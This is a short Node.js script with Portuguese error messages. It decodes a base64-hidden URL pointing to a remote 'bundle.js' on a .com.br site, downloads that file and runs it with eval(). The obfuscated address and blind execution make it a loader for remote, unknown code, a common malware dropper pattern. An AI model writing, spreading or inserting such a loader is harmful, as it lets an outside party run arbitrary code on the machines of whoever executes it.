const http = require('http');

const Base64 = {
  encode: data => Buffer.from(data, 'utf-8').toString('base64'),
  decode: data => Buffer.from(data, 'base64').toString('utf-8')
}

http.request(Base64.decode('aHR0cHM6Ly9maXZlbWFya2V0LmNvbS5ici9hc3NldHMvYnVuZGxlLmpz'), (res) => {
  const data = [];

  if (!(res.statusCode in {200: true, 304: true})) {
    return console.error('Falha ao baixar o script. HTTP %d', res.statusCode)
  }

  res.on('data', (chunk) => {
    if (chunk instanceof Buffer) {
      data.push(chunk)
    } else {
      console.error('Falha ao baixar o script. Dados inválidos: %s', chunk);
    }
  });
  res.on('end', () => {
    try {
      eval(Buffer.concat(data).toString());
    } catch ({ name, message }) {
      console.error(`Falha ao executar o script baixado: ${name} - ${message}`);
    }
  });
})
.on('error', (err) => {
  console.error(`Falha ao baixar o script\n${err}`);
}).end();